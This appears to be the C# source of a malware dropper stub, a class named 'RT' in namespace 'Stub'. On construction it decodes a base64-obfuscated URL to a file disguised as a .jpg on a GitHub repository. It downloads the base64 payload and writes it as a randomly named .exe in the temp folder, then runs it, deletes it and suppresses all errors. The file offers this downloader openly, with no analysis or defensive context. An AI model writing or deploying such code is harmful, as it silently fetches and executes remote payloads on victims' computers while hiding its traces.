using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;

namespace Stub;

internal class RT
{
	private const string alphabet = "asdfghjklqwertyuiopmnbvcxz";

	private static readonly Random random = new Random();

	public RT()
	{
		RT.rts();
	}

	public static string getRandomCharacters()
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 1; i <= new Random().Next(10, 20); i++)
		{
			stringBuilder.Append("asdfghjklqwertyuiopmnbvcxz"[RT.random.Next(0, "asdfghjklqwertyuiopmnbvcxz".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static void rts()
	{
		try
		{
			string text = Path.GetTempPath() + "\\" + RT.getRandomCharacters() + ".exe";
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			File.WriteAllBytes(text, Convert.FromBase64String(new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dvZE9mV2FyZUZhcmUvVGhlR29vZEtpZFBob3Rvcy9tYWluL3J0LmpwZw==")))).ReadToEnd()));
			Process.Start(text);
			File.Delete(text);
		}
		catch
		{
		}
	}
}
